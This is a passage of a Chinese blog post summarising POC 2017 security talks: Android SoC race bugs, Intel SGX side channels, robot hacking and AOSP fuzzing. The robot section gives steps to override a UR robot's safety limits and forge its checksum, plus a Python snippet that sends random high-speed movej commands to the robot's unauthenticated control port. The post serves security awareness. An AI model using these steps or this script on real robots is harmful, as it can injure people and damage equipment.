+<p>那都加锁又怎样</p>
+<p><img src="http://pic.giantbranch.cn/pic/1517972659755.jpg" alt></p>
+<p>两个线程有可能delete两次</p>
+<p><img src="http://pic.giantbranch.cn/pic/1517972686799.jpg" alt></p>
+<p><strong>Samsung s8 HDCP race</strong><br>对list find操作加锁</p>
+<p><img src="http://pic.giantbranch.cn/pic/1517972761613.jpg" alt></p>
+<p>对list del加锁</p>
+<p><img src="http://pic.giantbranch.cn/pic/1517972788721.jpg" alt></p>
+<p>但是对ss_node没有加锁</p>
+<p><img src="http://pic.giantbranch.cn/pic/1517973976266.jpg" alt></p>
+<p>另一个，这个应该是可以find同一个？，之后double delte and doule free</p>
+<p><img src="http://pic.giantbranch.cn/pic/1517974073132.jpg" alt></p>
+<p><strong>reference count overflow（计数溢出）</strong></p>
+<p><img src="http://pic.giantbranch.cn/pic/1517974595906.jpg" alt></p>
+<p>0xFFFFFFFF + 1 ——&gt; 0</p>
+<p><img src="http://pic.giantbranch.cn/pic/1517974627562.jpg" alt></p>
+<p>难点</p>
+<ul>
+<li>Hard to fuzz (cost much time to do increasing)</li>
+<li>Stable Use-After-Free issue</li>
+<li>Easily ignore</li>
+</ul>
+<p>总结</p>
+<ol>
+<li>在安卓的socs里面有很多类型的漏洞</li>
+<li>新的攻击面和攻击手法（模型）还有待发现</li>
+</ol>
+<h1 id="Tampering-with-Encrypted-Memory-Blocks-of-Trusted-Execution-Environment"><a href="#Tampering-with-Encrypted-Memory-Blocks-of-Trusted-Execution-Environment" class="headerlink" title="Tampering with Encrypted Memory Blocks of Trusted Execution Environment"></a>Tampering with Encrypted Memory Blocks of Trusted Execution Environment</h1><p>进程的边界并不能保护执行环境，比如我们可以dll注入</p>
+<p>沙箱：</p>
+<ul>
+<li>应用程序沙箱：IOS，Android</li>
+<li>Javascript沙箱： Chrome, Safari, Edge, etc</li>
+</ul>
+<p>沙箱能隔离执行环境，但其本身就会有漏洞</p>
+<p>一个内核漏洞就能破坏整个保护</p>
+<p><img src="http://pic.giantbranch.cn/pic/1518065764684.jpg" alt></p>
+<p>而添加更多的特却层并不能解决问题</p>
+<p><img src="http://pic.giantbranch.cn/pic/1518065894080.jpg" alt></p>
+<p>下面是作者给的一个硬件可信执行环境（可能会有硬件漏洞呢，比如之前的cpu漏洞，哈哈~）</p>
+<p><img src="http://pic.giantbranch.cn/pic/1518065924903.jpg" alt></p>
+<p>**Intel SGX</p>
+<p>TEE是这个安全机制的实现，运行在Ring3，用户层</p>
+<p><img src="http://pic.giantbranch.cn/pic/1518066110006.jpg" alt></p>
+<p>这个应该也是密码学的一个应用了，每个进程有一个key，只有用这个才能解密，才能访问</p>
+<p>不过要安全就会损失了性能了</p>
+<p><img src="http://pic.giantbranch.cn/pic/1518066177583.jpg" alt></p>
+<p>SGX’s Threat Model is Very Strong!
+除了核心包（core package），下面的所有都当作恶意的</p>
+<ul>
+<li>Device, firmware, …</li>
+<li>Operating systems, hypervisor …</li>
+</ul>
+<p>这个在云上（亚马逊，微软的azure）也有应用</p>
+<p>但是英特尔没有在SGX’s threat model里包含side-channel attacks（侧信道攻击）</p>
+<p><strong>Attacks to Intel SGX</strong></p>
+<p>那么本身有什么漏洞呢</p>
+<ul>
+<li>Controlled Channel Attack [Oakland ‘15]</li>
+<li>Finer-grained Controlled Channel Attack [USENIX Security ’17]</li>
+<li>Branch-predictor Attack [USENIX Security ‘17]</li>
+<li>Dark-ROP [USENIX Security ‘17] (My work!!)</li>
+<li>CacheZoom [arXiv]</li>
+</ul>
+<p>这些都是side-channel attacks（侧信道攻击）</p>
+<p><strong>Summarizing TEE</strong></p>
+<ol>
+<li>基于硬件的TEE和Intel SGX是一种前沿的技术</li>
+<li>在不同平台的实现<ul>
+<li>ARM TrustZone</li>
+</ul>
+</li>
+</ol>
+<ul>
+<li>AMD SME/SEV</li>
+<li>Intel SGX</li>
+</ul>
+<ol start="3">
+<li>一个强大的安全机制，但也可能是新的攻击向量（目标）</li>
+</ol>
+<p>保护EPC的完整性，用tree结构保存数据的hash，父节点储存child的节点的hash<br>只有硬件黑客才能篡改</p>
+<p><img src="http://pic.giantbranch.cn/pic/1518227017531.jpg" alt></p>
+<p>但是还是可以缓解硬件黑客</p>
+<p><img src="http://pic.giantbranch.cn/pic/1518227883953.jpg" alt></p>
+<p>接下来的The Rowhammer Attack（排锤攻击？），不是很懂</p>
+<p><img src="http://pic.giantbranch.cn/pic/1518228112165.jpg" alt></p>
+<h1 id="Hacking-Robots-Before-Skynet"><a href="#Hacking-Robots-Before-Skynet" class="headerlink" title="Hacking Robots Before Skynet"></a>Hacking Robots Before Skynet</h1><p><strong>认证绕过</strong></p>
+<p>不过</p>
+<p><img src="http://pic.giantbranch.cn/pic/1518255883382.jpg" alt></p>
+<p><strong>将友好的机器人变为evil机器人</strong></p>
+<p><img src="http://pic.giantbranch.cn/pic/1518256158260.jpg" alt></p>
+<p><strong>将有摄像头的机器人变为间谍摄像头</strong></p>
+<p><img src="http://pic.giantbranch.cn/pic/1518256593518.jpg" alt></p>
+<p><img src="http://pic.giantbranch.cn/pic/1518256600757.jpg" alt></p>
+<p><strong>未保护的蓝牙适配器</strong></p>
+<p>对蓝牙不熟悉，这里说默认的pin是0000（我感觉4位是不是可以爆破了）</p>
+<p>还有下面的，通信不用认证？</p>
+<p><img src="http://pic.giantbranch.cn/pic/1518256724068.jpg" alt="enter description here"></p>
+<p><strong>未文档化的函数运行远程获取OAuth Access Token</strong></p>
+<p><img src="http://pic.giantbranch.cn/pic/1518256912277.jpg" alt></p>
+<p><strong>机器人漏洞挖掘</strong></p>
+<ol>
+<li>版本信息</li>
+</ol>
+<p><img src="http://pic.giantbranch.cn/pic/1518257953049.jpg" alt></p>
+<ol start="2">
+<li>缓冲区溢出</li>
+</ol>
+<p><img src="http://pic.giantbranch.cn/pic/1518257969527.jpg" alt></p>
+<ol start="3">
+<li>Modify the safety.conf file to override all safety general limits,<br>joints limits, boundaries, and safety I/O values.</li>
+<li>Force a collision in the checksum calculation, and upload the new<br>file. We need to fake this number since integrators are likely to<br>write a note with the current checksum value on the hardware, as<br>this is a common best practice.</li>
+<li>Restart the robot so the safety configurations are updated by the<br>new file. Process continuation !</li>
+<li>Load new installation file (new safety settings)</li>
+<li>Move the robot in an arbitrary, dangerous manner by exploiting an<br>authentication issue on the UR control service.</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">s.connect((HOST, 30002))</span><br><span class="line">for x in xrange(50):</span><br><span class="line">q = [random.uniform(-2*math.pi, 2*math.pi), \</span><br><span class="line">random.uniform(-2*math.pi, 2*math.pi), \</span><br><span class="line">random.uniform(-2*math.pi, 2*math.pi), \</span><br><span class="line">random.uniform(-2*math.pi, 2*math.pi), \</span><br><span class="line">random.uniform(-2*math.pi, 2*math.pi), \</span><br><span class="line">random.uniform(-2*math.pi, 2*math.pi)] ← joint positions</span><br><span class="line">a = random.uniform(1, 20) ← joint acceleration</span><br><span class="line">v = random.uniform(1, 20) ← joint speed</span><br><span class="line">payload = &quot;movej(&quot;+ str(q) + &quot;, a=&quot;+str(a)+&quot;, v=&quot;+str(v)+&quot;)&quot; ← move</span><br><span class="line">joints</span><br><span class="line">s.send(payload + &quot;\n&quot;)</span><br><span class="line">print &quot;[!] Sent&quot;, payload</span><br><span class="line">time.sleep(1)</span><br><span class="line">data = s.recv(1024)</span><br><span class="line">s.close()</span><br><span class="line">print(&quot;Received&quot;, repr(data))</span><br></pre></td></tr></table></figure>
+
+<p><strong>可关闭安全设置</strong></p>
+<p><img src="http://pic.giantbranch.cn/pic/1518312226154.jpg" alt></p>
+<p>另一款机器，可发消息控制</p>
+<p><img src="http://pic.giantbranch.cn/pic/1518312325773.jpg" alt></p>
+<p><strong>Vulnerable Research Frameworks: ROS</strong></p>
+<p><img src="http://pic.giantbranch.cn/pic/1518312504917.jpg" alt></p>
+<p><strong>物理攻击之连接篇</strong></p>
+<p>哈哈，插个网线再黑你</p>
+<p><img src="http://pic.giantbranch.cn/pic/1518312567883.jpg" alt></p>
+<p>还可以用无限鼠标键盘控制（当然要有usb接口）</p>
+<p><img src="http://pic.giantbranch.cn/pic/1518312665455.jpg" alt></p>
+<p>这个头部后面也有个网口</p>
+<p><img src="http://pic.giantbranch.cn/pic/1518312702652.jpg" alt></p>
+<p><strong>物理攻击之不安全储存</strong></p>
+<p><img src="http://pic.giantbranch.cn/pic/1518312839062.jpg" alt></p>
+<p>更恐怖的是供应商的cloud可以黑掉并控制，强大的机器人军队来袭</p>
+<p><img src="http://pic.giantbranch.cn/pic/1518312913527.jpg" alt></p>
+<p><strong>“杀死机器人”</strong></p>
+<p>有些机器人开放了恢复出厂和更新接口，还可以远程调用，还没有校验</p>
+<p><img src="http://pic.giantbranch.cn/pic/1518313029186.jpg" alt></p>
+<p><strong>云服务之账号劫持</strong></p>
+<p><img src="http://pic.giantbranch.cn/pic/1518313166620.jpg" alt></p>
+<p><strong>未签名的固件/应用的更新</strong></p>
+<p><img src="http://pic.giantbranch.cn/pic/1518313243518.jpg" alt></p>
+<p><strong>最后来个汇总吧</strong></p>
+<p><img src="http://pic.giantbranch.cn/pic/1518313371481.jpg" alt></p>
+<p><strong>机器人被黑的后果</strong></p>
+<ul>
+<li>In the home<br>Privacy issues, human and property damage</li>
+<li>Businesses &amp; Industry<br>Espionage（间谍）, human and property damage,<br>corporate/business network compromise</li>
+<li>Healthcare &amp; Militar<br>Direct human threats</li>
+</ul>
+<p><strong>提升安全性</strong></p>
+<ul>
+<li>Security from Day One</li>
+<li>Factory Restore</li>
+<li>Secure the Supply Chain（供应链）</li>
+<li>Secure by Default</li>
+<li>Education</li>
+<li>Vulnerability Disclosure Response</li>
+<li>Invest less in marketing and more in cyber security（少投资于市场营销，多投资于网络安全。）</li>
+</ul>
+<h1 id="Fuzzing-AOSP-For-the-Masses"><a href="#Fuzzing-AOSP-For-the-Masses" class="headerlink" title="Fuzzing AOSP For the Masses"></a>Fuzzing AOSP For the Masses</h1><p><strong>fuzzing目标</strong></p>
+<p><img src="http://pic.giantbranch.cn/pic/1518318927596.jpg" alt></p>
+<p><strong>focus on</strong></p>
+<ul>
+<li>Remotely accessible<br>Media (audio/video)<br>Parsing code (XML, etc.)<br>Fonts<br>WiFi/Bluetooth/Radio</li>
+<li>Allows for privesc or sandbox escape<br>Graphics<br>Kernel/Drivers<br>Firmware Interfaces</li>
+<li>Rarely executed == less likely to be tested</li>
+</ul>
+<p><strong>Android Open Source Project</strong></p>
+<p>Easier fuzzing with source-level tools</p>
+<p><strong>Fuzzing userspace: Sanitizers</strong></p>
+<ul>
+<li>AddressSanitizer<br>source.android.com/devices/tech/debug/asan</li>
+<li>SanitizerCoverage<br>clang.llvm.org/docs/SanitizerCoverage.html</li>
+</ul>
+<p><strong>AddressSanitizer (ASAN)</strong><br>Fast memory error detector<br>Two parts:</p>
+<ul>
+<li>Compiler instrumentation</li>
+<li>Run-time library</li>
+</ul>
+<p>ASAN can detect:</p>
+<ul>
+<li>Out-of-bounds accesses to heap, stack and globals</li>
+<li>Use-after-free</li>
+<li>Use-after-return (runtime flag ASAN_OPTIONS=detect_stack_use_after_return=1)</li>
+<li>Use-after-scope (clang flag -fsanitize-address-use-after-scope)</li>
+<li>Double-free, invalid free</li>
+<li>Memory leaks (experimental)</li>
+</ul>
+<p><img src="http://pic.giantbranch.cn/pic/1518319280377.jpg" alt></p>
+<p><strong>Fuzzing userspace: libFuzzer</strong></p>
+<p><img src="http://pic.giantbranch.cn/pic/1518319344465.jpg" alt></p>
+<p><img src="http://pic.giantbranch.cn/pic/1518319401786.jpg" alt></p>
+<p><strong>Fuzzing Kernelspace: KASAN</strong></p>
+<p><img src="http://pic.giantbranch.cn/pic/1518319444485.jpg" alt></p>
+<p><strong>Fuzzing Kernelspace: KCOV</strong></p>
+<ul>
+<li>TL;DR: SanitizerCoverage in the Kernel</li>
+<li>Allows for simple code coverage instrumentation</li>
+<li>Basic-block level instrumentation</li>
+<li>Enabled with CONFIG_KCOV</li>
+<li>Implemented with kernel debugfs extension that collects and exposes<br>coverage per-thread</li>
+</ul>
+<p><strong>Fuzzing Kernelspace: syzkaller</strong></p>
+<p>Coverage guided Linux syscall fuzzer<br>Supported in android on pixel devices<br>Requires a kernel with KASAN and KCOV enabled<br>Uses syscall descriptions to generate “programs” that correspond to fuzzing inputs</p>
+<p><img src="http://pic.giantbranch.cn/pic/1518319538621.jpg" alt></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+      <div>
+        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+  <div>自愿打赏专区</div>
+  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+    <span>打赏</span>
+  </button>
+  <div id="QR" style="display: none;">
+
+    
+      <div id="wechat" style="display: inline-block">
+        <img id="wechat_qr" src="http://paypic.giantbranch.cn/wechat.png" alt="giantbranch 微信支付">
+        <p>微信支付</p>
+      </div>
+    
+
+    
+      <div id="alipay" style="display: inline-block">
+        <img id="alipay_qr" src="http://paypic.giantbranch.cn/alipay.png" alt="giantbranch 支付宝">
+        <p>支付宝</p>
+      </div>
+    
+
+    
+
+  </div>
+</div>
+
+      </div>
+    
+    
+      <div class="footer-custom">
+        <b>paypal: <a href="https://www.paypal.me/giantbranch">https://www.paypal.me/giantbranch</a> </b>
+      </div>
+    
+
+    
+    <div style="padding: 10px 0; margin: 20px auto; width: 100%; text-align: center;">
+    	<div><img src="http://paypic.giantbranch.cn/ask.png"></div>
+    </div>
+      <div>
+        <ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者：</strong>
+    giantbranch
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://www.giantbranch.cn/2018/02/06/POC 2017的一些要点记录/" title="POC 2017的一些要点记录">https://www.giantbranch.cn/2018/02/06/POC 2017的一些要点记录/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>
+    本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+
+      </div>
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/安全大会/" rel="tag"># 安全大会</a>
+          
+            <a href="/tags/议题/" rel="tag"># 议题</a>
+          
+            <a href="/tags/记录/" rel="tag"># 记录</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/02/06/为什么我毕业后还偶尔打打ctf比赛/" rel="next" title="为什么我毕业后还偶尔打打ctf比赛">
+                <i class="fa fa-chevron-left"></i> 为什么我毕业后还偶尔打打ctf比赛
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/03/11/PortDog端口扫描异常检测工具源码简析/" rel="prev" title="PortDog端口扫描异常检测工具源码简析">
+                PortDog端口扫描异常检测工具源码简析 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+        
+  <div class="bdsharebuttonbox">
+    <a href="#" class="bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+    <a href="#" class="bds_douban" data-cmd="douban" title="分享到豆瓣网"></a>
+    <a href="#" class="bds_sqq" data-cmd="sqq" title="分享到QQ好友"></a>
+    <a href="#" class="bds_qzone" data-cmd="qzone" title="分享到QQ空间"></a>
+    <a href="#" class="bds_weixin" data-cmd="weixin" title="分享到微信"></a>
+    <a href="#" class="bds_tieba" data-cmd="tieba" title="分享到百度贴吧"></a>
+    <a href="#" class="bds_twi" data-cmd="twi" title="分享到Twitter"></a>
+    <a href="#" class="bds_fbook" data-cmd="fbook" title="分享到Facebook"></a>
+    <a href="#" class="bds_more" data-cmd="more"></a>
+    <a class="bds_count" data-cmd="count"></a>
+  </div>
+  <script>
+    window._bd_share_config = {
+      "common": {
+        "bdText": "",
+        "bdMini": "2",
+        "bdMiniList": false,
+        "bdPic": ""
+      },
+      "share": {
+        "bdSize": "16",
+        "bdStyle": "0"
+      },
+      "image": {
+        "viewList": ["tsina", "douban", "sqq", "qzone", "weixin", "twi", "fbook"],
+        "viewText": "分享到：",
+        "viewSize": "16"
+      }
+    }
+  </script>
+
+<script>
+  with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='//bdimg.share.baidu.com/static/api/js/share.js?cdnversion='+~(-new Date()/36e5)];
+</script>
+
+      
+    </div>
+    <div class="footer-custom">
+	<b>假如你看不到评论，可能是你访问Disqus被墙了，请使用代理访问</b>
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  
+    <div class="comments" id="comments">
+      <div id="disqus_thread">
+        <noscript>
+          Please enable JavaScript to view the
+          <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a>
+        </noscript>
+      </div>
+    </div>
+  
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">giantbranch</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">160</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">201</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          <div class="links-of-author motion-element">
+            
+              
+                <span class="links-of-author-item">
+                  <a href="https://github.com/giantbranch" target="_blank" title="GitHub">
+                    
+                      <i class="fa fa-fw fa-github"></i>GitHub</a>
+                </span>
+              
+                <span class="links-of-author-item">
+                  <a href="https://twitter.com/giantbranch" target="_blank" title="Twitter">
+                    
+                      <i class="fa fa-fw fa-twitter"></i>Twitter</a>
+                </span>
+              
+            
+          </div>
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-globe"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://blog.csdn.net/u012763794" title="my csdn blog" target="_blank">my csdn blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://oldblog.giantbranch.cn/" title="old blog" target="_blank">old blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://weaponx.site/" title="WeaponX" target="_blank">WeaponX</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.tasfa.cn/" title="Tasfa" target="_blank">Tasfa</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://matshao.com/" title="MatShao" target="_blank">MatShao</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Hybrid-App-SecurityAttack-and-defense"><span class="nav-number">1.</span> <span class="nav-text">Hybrid App SecurityAttack and defense</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Launch-Impossible-Current-State-of-Application-Control-Bypasses-on-ATMs"><span class="nav-number">2.</span> <span class="nav-text">Launch Impossible  Current State of Application Control Bypasses on ATMs.</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#An-awesome-toolkit-for-testing-the-virtualization-system"><span class="nav-number">3.</span> <span class="nav-text">An awesome toolkit for testing the virtualization system</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#The-android-vulnerability-discovery-in-SoC"><span class="nav-number">4.</span> <span class="nav-text">The android vulnerability discovery in SoC</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Tampering-with-Encrypted-Memory-Blocks-of-Trusted-Execution-Environment"><span class="nav-number">5.</span> <span class="nav-text">Tampering with Encrypted Memory Blocks of Trusted Execution Environment</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Hacking-Robots-Before-Skynet"><span class="nav-number">6.</span> <span class="nav-text">Hacking Robots Before Skynet</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Fuzzing-AOSP-For-the-Masses"><span class="nav-number">7.</span> <span class="nav-text">Fuzzing AOSP For the Masses</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2017 &mdash; <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">giantbranch</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.3</div>
+
+
+
+
+<div class="footer-custom">
+<!-- <a href="https://beian.miit.gov.cn/">粤ICP备16051028号-1</a> -->
+<br>
+这是我的新博客，网站建于2017年10月
+<!-- <br>以下UV,PV统计始于2018.06.23 -->
+</div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.3"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.3"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.3"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  
+
+    
+      <script id="dsq-count-scr" src="https://giantbranch.disqus.com/count.js" async></script>
+    
+
+    
+      <script type="text/javascript">
+        var disqus_config = function () {
+          this.page.url = 'https://www.giantbranch.cn/2018/02/06/POC 2017的一些要点记录/';
+          this.page.identifier = '2018/02/06/POC 2017的一些要点记录/';
+          this.page.title = 'POC 2017的一些要点记录';
+        };
+        var d = document, s = d.createElement('script');
+        s.src = 'https://giantbranch.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', '' + +new Date());
+        (d.head || d.body).appendChild(s);
+      </script>
+    
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
